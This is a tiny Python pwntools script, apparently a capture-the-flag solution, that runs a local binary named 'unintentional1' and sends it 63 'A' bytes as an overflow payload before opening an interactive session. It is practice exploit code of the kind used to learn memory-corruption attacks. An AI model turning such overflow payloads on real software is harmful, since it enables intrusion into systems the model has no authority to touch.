#!/usr/bin/env python3

from pwn import *

TARGET = './unintentional1'
p = process(TARGET)
context.arch = 'amd64'

payload = b'A' * 63
p.sendlineafter(b'what: ', payload)

p.interactive()